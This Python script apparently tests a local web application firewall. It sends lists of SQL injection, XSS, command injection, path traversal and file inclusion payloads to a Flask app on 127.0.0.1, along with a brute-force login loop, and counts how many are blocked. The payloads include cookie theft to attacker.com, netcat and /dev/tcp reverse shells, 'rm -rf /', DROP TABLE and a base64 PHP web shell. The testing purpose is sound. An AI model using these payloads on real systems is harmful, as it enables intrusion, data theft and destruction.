"""
Attack Generator for Dashboard Testing
Generates realistic attack data to demonstrate WAF capabilities
Run this to populate your dashboard with test data
"""

import requests
import time
import random
from datetime import datetime

# CONFIGURATION
BASE_URL = "http://127.0.0.1:5000"  # Change if your Flask app runs on different port
DELAY_BETWEEN_ATTACKS = 0.5  # seconds between requests

def print_header(text):
    print("\n" + "="*70)
    print(f"  {text}")
    print("="*70)

def send_attack(attack_type, path, payload, method='GET'):
    """Send a single attack request"""
    try:
        if method == 'GET':
            response = requests.get(f"{BASE_URL}{path}", params=payload, timeout=5)
        else:
            response = requests.post(f"{BASE_URL}{path}", data=payload, timeout=5)
        
        status = "🔴 BLOCKED" if response.status_code == 403 else "🟢 PASSED"
        print(f"{status} [{attack_type}] {path} - Status: {response.status_code}")
        return response.status_code == 403
        
    except requests.exceptions.ConnectionError:
        print(f"❌ ERROR: Cannot connect to {BASE_URL}")
        print("   Make sure Flask app is running: python app.py")
        return False
    except Exception as e:
        print(f"❌ ERROR: {e}")
        return False

def generate_sql_injection_attacks():
    """Generate SQL Injection attacks"""
    print_header("SQL INJECTION ATTACKS")
    
    attacks = [
        # Union-based
        ("/search", {"q": "' UNION SELECT username,password FROM users--"}),
        ("/product", {"id": "1' UNION ALL SELECT null,database(),user()--"}),
        ("/filter", {"category": "books' OR 1=1--"}),
        
        # Boolean-based blind
        ("/login", {"username": "admin'--", "password": "anything"}),
        ("/user", {"id": "1' AND '1'='1"}),
        ("/search", {"q": "test' OR 'a'='a"}),
        
        # Time-based blind
        ("/search", {"q": "test' AND SLEEP(5)--"}),
        ("/page", {"id": "1' AND BENCHMARK(1000000,MD5('A'))--"}),
        
        # Stacked queries
        ("/search", {"q": "test'; DROP TABLE users--"}),
        ("/data", {"filter": "1'; DELETE FROM logs WHERE 1=1--"}),
        
        # Information gathering
        ("/api/data", {"table": "users' UNION SELECT table_name FROM information_schema.tables--"}),
        ("/query", {"sql": "SELECT * FROM users WHERE id=1' AND extractvalue(1,concat(0x7e,version()))--"}),
    ]
    
    blocked = 0
    for path, payload in attacks:
        if send_attack("SQL Injection", path, payload):
            blocked += 1
        time.sleep(DELAY_BETWEEN_ATTACKS)
    
    print(f"\n📊 Results: {blocked}/{len(attacks)} attacks blocked")
    return blocked, len(attacks)

def generate_xss_attacks():
    """Generate Cross-Site Scripting attacks"""
    print_header("CROSS-SITE SCRIPTING (XSS) ATTACKS")
    
    attacks = [
        # Script injection
        ("/search", {"q": "<script>alert('XSS')</script>"}),
        ("/comment", {"text": "<script>document.location='http://evil.com'</script>"}),
        ("/profile", {"bio": "<script>fetch('http://attacker.com?cookie='+document.cookie)</script>"}),
        
        # Event handler injection
        ("/search", {"q": "<img src=x onerror=alert(1)>"}),
        ("/comment", {"text": "<body onload=alert('XSS')>"}),
        ("/input", {"data": "<svg/onload=alert('XSS')>"}),
        
        # JavaScript protocol
        ("/profile", {"website": "javascript:alert(document.cookie)"}),
        ("/link", {"url": "javascript:void(document.location='http://evil.com')"}),
        
        # Encoded XSS
        ("/search", {"q": "%3Cscript%3Ealert(1)%3C/script%3E"}),
        
        # DOM-based XSS
        ("/page", {"content": "<iframe src='javascript:alert(1)'></iframe>"}),
        ("/post", {"message": "<object data='javascript:alert(1)'>"}),
        
        # Advanced XSS
        ("/input", {"field": "<details open ontoggle=alert(1)>"}),
    ]
    
    blocked = 0
    for path, payload in attacks:
        if send_attack("XSS", path, payload):
            blocked += 1
        time.sleep(DELAY_BETWEEN_ATTACKS)
    
    print(f"\n📊 Results: {blocked}/{len(attacks)} attacks blocked")
    return blocked, len(attacks)

def generate_command_injection_attacks():
    """Generate Command Injection attacks"""
    print_header("COMMAND INJECTION ATTACKS")
    
    attacks = [
        # Basic command injection
        ("/exec", {"cmd": "; cat /etc/passwd"}),
        ("/run", {"command": "| ls -la"}),
        ("/ping", {"host": "127.0.0.1; whoami"}),
        
        # Shell metacharacters
        ("/system", {"input": "`id`"}),
        ("/exec", {"cmd": "$(uname -a)"}),
        ("/diag", {"tool": "ping && wget http://evil.com/shell.sh"}),
        
        # Command chaining
        ("/cmd", {"exec": "127.0.0.1 || cat /etc/shadow"}),
        ("/shell", {"input": "; rm -rf /"}),
        
        # Encoded injection
        ("/run", {"command": "%3B%20cat%20%2Fetc%2Fpasswd"}),
        
        # Reverse shell attempts
        ("/exec", {"cmd": "; nc -e /bin/bash attacker.com 4444"}),
        ("/system", {"input": "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"}),
    ]
    
    blocked = 0
    for path, payload in attacks:
        if send_attack("Command Injection", path, payload):
            blocked += 1
        time.sleep(DELAY_BETWEEN_ATTACKS)
    
    print(f"\n📊 Results: {blocked}/{len(attacks)} attacks blocked")
    return blocked, len(attacks)

def generate_directory_traversal_attacks():
    """Generate Directory Traversal attacks"""
    print_header("DIRECTORY TRAVERSAL ATTACKS")
    
    attacks = [
        # Basic traversal
        ("/files", {"path": "../../../../etc/passwd"}),
        ("/download", {"file": "..\\..\\..\\windows\\system32\\config\\sam"}),
        ("/include", {"page": "../../../etc/shadow"}),
        
        # Encoded traversal
        ("/read", {"file": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"}),
        ("/get", {"path": "..%252f..%252f..%252fetc%252fpasswd"}),
        
        # Sensitive file access
        ("/view", {"doc": "../../../../../../proc/self/environ"}),
        ("/show", {"file": "../../../var/log/apache2/access.log"}),
        ("/open", {"doc": "/var/www/../../etc/passwd"}),
        
        # Windows paths
        ("/load", {"file": "c:\\windows\\win.ini"}),
        ("/fetch", {"resource": "..\\..\\..\\boot.ini"}),
    ]
    
    blocked = 0
    for path, payload in attacks:
        if send_attack("Directory Traversal", path, payload):
            blocked += 1
        time.sleep(DELAY_BETWEEN_ATTACKS)
    
    print(f"\n📊 Results: {blocked}/{len(attacks)} attacks blocked")
    return blocked, len(attacks)

def generate_file_inclusion_attacks():
    """Generate Remote/Local File Inclusion attacks"""
    print_header("FILE INCLUSION ATTACKS")
    
    attacks = [
        # PHP wrappers
        ("/include", {"file": "php://filter/convert.base64-encode/resource=/etc/passwd"}),
        ("/page", {"include": "php://input"}),
        
        # Remote file inclusion
        ("/load", {"url": "http://evil.com/shell.txt"}),
        ("/include", {"file": "http://attacker.com/backdoor.php"}),
        
        # Data URIs
        ("/view", {"content": "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+"}),
        
        # Null byte injection
        ("/include", {"file": "../../../../etc/passwd%00"}),
        
        # Protocol wrappers
        ("/load", {"file": "expect://id"}),
        ("/fetch", {"resource": "file:///etc/passwd"}),
    ]
    
    blocked = 0
    for path, payload in attacks:
        if send_attack("File Inclusion", path, payload):
            blocked += 1
        time.sleep(DELAY_BETWEEN_ATTACKS)
    
    print(f"\n📊 Results: {blocked}/{len(attacks)} attacks blocked")
    return blocked, len(attacks)

def generate_anomalous_behavior():
    """Generate anomalous traffic patterns"""
    print_header("ANOMALOUS BEHAVIOR DETECTION")
    
    print("Generating high-frequency requests (potential DoS)...")
    blocked = 0
    total = 0
    
    # Simulate brute force login
    for i in range(60):
        payload = {"username": f"admin{i}", "password": f"pass{i}"}
        if send_attack("Brute Force", "/login", payload, method='POST'):
            blocked += 1
        total += 1
        time.sleep(0.1)  # Rapid requests
    
    # Unusual payload sizes
    print("\nGenerating unusually large payloads...")
    large_payload = {"data": "A" * 10000}
    if send_attack("Large Payload", "/api/data", large_payload, method='POST'):
        blocked += 1
    total += 1
    time.sleep(DELAY_BETWEEN_ATTACKS)
    
    # High special character density
    print("Generating payloads with excessive special characters...")
    special_payloads = [
        {"input": "!@#$%^&*(){}[]|\\:;\"'<>,.?/~`"},
        {"data": "====||||>>>><<<<<&&&&^^^^%%%%"},
        {"text": "(((()))){{{{}}}}[[[[]]]]"},
    ]
    for payload in special_payloads:
        if send_attack("Special Chars", "/search", payload):
            blocked += 1
        total += 1
        time.sleep(DELAY_BETWEEN_ATTACKS)
    
    print(f"\n📊 Results: {blocked}/{total} anomalies detected")
    return blocked, total

def generate_mixed_attacks():
    """Generate a mix of different attack types"""
    print_header("MIXED ATTACK SIMULATION (Realistic Scenario)")
    
    print("Simulating a real attacker probing the application...\n")
    
    scenarios = [
        ("Reconnaissance", "/robots.txt", {}),
        ("Reconnaissance", "/.git/config", {}),
        ("Reconnaissance", "/admin", {}),
        ("SQL Injection", "/search", {"q": "' OR '1'='1' --"}),
        ("XSS Probe", "/search", {"q": "<script>alert(1)</script>"}),
        ("Directory Traversal", "/files", {"path": "../../../etc/passwd"}),
        ("Command Injection", "/ping", {"host": "127.0.0.1; cat /etc/passwd"}),
        ("SQL Injection", "/login", {"username": "admin'--", "password": "x"}),
        ("File Inclusion", "/page", {"include": "http://evil.com/shell.php"}),
        ("XSS", "/comment", {"text": "<img src=x onerror=alert(1)>"}),
    ]
    
    blocked = 0
    for attack_type, path, payload in scenarios:
        if send_attack(attack_type, path, payload):
            blocked += 1
        time.sleep(1)  # Slower, more realistic timing
    
    print(f"\n📊 Results: {blocked}/{len(scenarios)} attacks blocked")
    return blocked, len(scenarios)

def run_all_tests():
    """Run all attack generation scenarios"""
    print("\n" + "🔥"*35)
    print(" "*20 + "WAF ATTACK GENERATOR")
    print(" "*15 + "Dashboard Testing & Demonstration")
    print("🔥"*35)
    
    print(f"\n⏰ Started at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"🎯 Target: {BASE_URL}")
    print(f"⚠️  Warning: This will send attack traffic to your application!")
    print(f"    Make sure your Flask app is running first.")
    
    input("\nPress ENTER to continue or Ctrl+C to cancel...")
    
    total_blocked = 0
    total_attacks = 0
    
    # Run each attack category
    results = []
    
    blocked, total = generate_sql_injection_attacks()
    results.append(("SQL Injection", blocked, total))
    total_blocked += blocked
    total_attacks += total
    
    blocked, total = generate_xss_attacks()
    results.append(("XSS", blocked, total))
    total_blocked += blocked
    total_attacks += total
    
    blocked, total = generate_command_injection_attacks()
    results.append(("Command Injection", blocked, total))
    total_blocked += blocked
    total_attacks += total
    
    blocked, total = generate_directory_traversal_attacks()
    results.append(("Directory Traversal", blocked, total))
    total_blocked += blocked
    total_attacks += total
    
    blocked, total = generate_file_inclusion_attacks()
    results.append(("File Inclusion", blocked, total))
    total_blocked += blocked
    total_attacks += total
    
    blocked, total = generate_anomalous_behavior()
    results.append(("Anomalous Behavior", blocked, total))
    total_blocked += blocked
    total_attacks += total
    
    blocked, total = generate_mixed_attacks()
    results.append(("Mixed Attacks", blocked, total))
    total_blocked += blocked
    total_attacks += total
    
    # Final summary
    print("\n" + "="*70)
    print("  ATTACK GENERATION COMPLETE - SUMMARY")
    print("="*70)
    
    for category, blocked, total in results:
        percentage = (blocked / total * 100) if total > 0 else 0
        print(f"{category:25s}: {blocked:3d}/{total:3d} blocked ({percentage:.1f}%)")
    
    print("-"*70)
    overall_percentage = (total_blocked / total_attacks * 100) if total_attacks > 0 else 0
    print(f"{'OVERALL':25s}: {total_blocked:3d}/{total_attacks:3d} blocked ({overall_percentage:.1f}%)")
    print("="*70)
    
    print(f"\n✅ Done! Your dashboard should now show {total_blocked} blocked attacks.")
    print(f"📊 View dashboard at: {BASE_URL}/monitor")
    print(f"⏰ Completed at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

if __name__ == "__main__":
    try:
        run_all_tests()
    except KeyboardInterrupt:
        print("\n\n⚠️  Attack generation cancelled by user.")
    except Exception as e:
        print(f"\n\n❌ Error: {e}")